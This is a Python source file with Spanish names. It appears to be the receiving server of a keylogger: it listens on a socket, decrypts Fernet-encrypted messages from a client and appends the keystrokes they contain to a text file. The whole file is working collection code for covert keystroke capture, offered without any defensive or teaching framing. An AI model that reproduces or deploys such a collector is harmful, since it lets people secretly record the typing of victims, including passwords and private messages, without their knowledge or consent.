import socket
import os
from cryptography.fernet import Fernet

def escribir(tecla):
	with open('resumenteclas.txt','a') as archivo:
		if(tecla == 'Key.enter'):
			archivo.write(tecla + os.linesep)
		else:
			archivo.write(tecla)
		print('tecla:' + tecla)

def cargar_clave():
	return open("clave.key","rb").read()


mi_socket = socket.socket()
mi_socket.bind(('192.168.0.19',4205))
mi_socket.listen(3)
clave = cargar_clave()
print(clave)
f = Fernet(clave)
print("hola mundo")
while True:
	conexion,addr = mi_socket.accept()
	print("nueva conexion:")
	print(addr)
	respuesta = conexion.recv(1024)
	mensajedesencriptado = f.decrypt(respuesta)
	print(str(mensajedesencriptado))
	escribir(str(mensajedesencriptado))
